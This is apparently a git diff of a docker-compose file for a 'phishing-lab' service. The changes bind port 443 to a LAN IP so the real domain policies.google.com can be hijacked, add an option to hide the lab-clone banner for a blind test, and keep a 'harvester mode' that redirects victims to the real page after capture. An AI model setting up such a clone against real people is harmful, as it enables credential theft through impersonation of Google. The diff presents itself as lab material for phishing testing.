@@ -3,15 +3,24 @@ services:
     build: .
     container_name: phishing-lab
     ports:
-      - "443:8443"    # https://localhost — clean URL, no port
-      - "8443:8443"   # https://localhost:8443 / https://<lan-ip>:8443
+      # 443 en la IP LAN: para el hijack del dominio REAL (policies.google.com
+      # -> esta máquina). Se bindea a una IP concreta para no chocar con otras
+      # interfaces (p.ej. tailscale serve en su propia IP:443).
+      - "${LAB_IP:-127.0.0.1}:443:8443"
+      # 8443: acceso directo https://localhost:8443 / https://<lan-ip>:8443
+      - "8443:8443"
     environment:
       LAB_HOST: 0.0.0.0
       LAB_CERT: /certs/server.pem
       LAB_KEY: /certs/server.key
-      # Realistic harvester mode: 302 to the real site after capture,
-      # so the "victim" never notices. Uncomment to try it:
-      # LAB_REDIRECT_URL: https://www.pccomponentes.com/
+      LAB_SITE_DIR: /app/site
+      # El banner rojo "CLON DE LABORATORIO" se inyecta en cada HTML servido.
+      # Para un test a ciegas (sin marca visible) ponlo a 0:
+      # LAB_BANNER: "0"
+      # Realistic harvester mode: 302 to the real page, so the "victim"
+      # never sees the clone. Uncomment to try it:
+      # LAB_REDIRECT_URL: https://policies.google.com/terms
     volumes:
       - ./certs:/certs:ro
-      - ./captured.log:/app/captured.log
+      - ./site:/app/site:ro
+      - ./access.log:/app/access.log
